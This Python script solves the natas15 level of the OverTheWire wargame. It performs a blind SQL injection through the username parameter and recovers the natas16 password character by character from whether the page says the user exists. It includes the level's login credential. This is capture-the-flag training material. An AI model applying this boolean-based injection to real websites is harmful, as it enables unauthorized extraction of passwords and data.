#!/usr/bin/env python
# This script will check for natas16 password in the database char by char
# Based on the output of the page, check for first char, second and so on..

import requests, string

# natas url
url = "http://natas15.natas.labs.overthewire.org/"
# Authentication
auth_username = "natas15"
auth_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

# The password built from letters and numbers
char = string.letters+string.digits
# Output when the query ok
exists_string = 'This user exists'
password_dictionary=[]
# Start sql injection to get the password (password size=32)
print 'Start brute force on ', url
for i in range(32):
    # Run on all the letters and digits and check if the password starts with char
    for c in char:
        query = '?username=natas16" and password like  binary "'+ ''.join(password_dictionary) + c +'%"-- '
        uri = ''.join([url+query])
        r = requests.get(uri, auth=(auth_username,auth_password))
        # If the output have exists_string - means that the query OK
        if exists_string in r.text:
            # Add the letter to the password dictionary and look for the next character
            password_dictionary.append(c)
            print ("Password: {0}").format(''.join(password_dictionary))
            # Break the loop and start a new char
            break

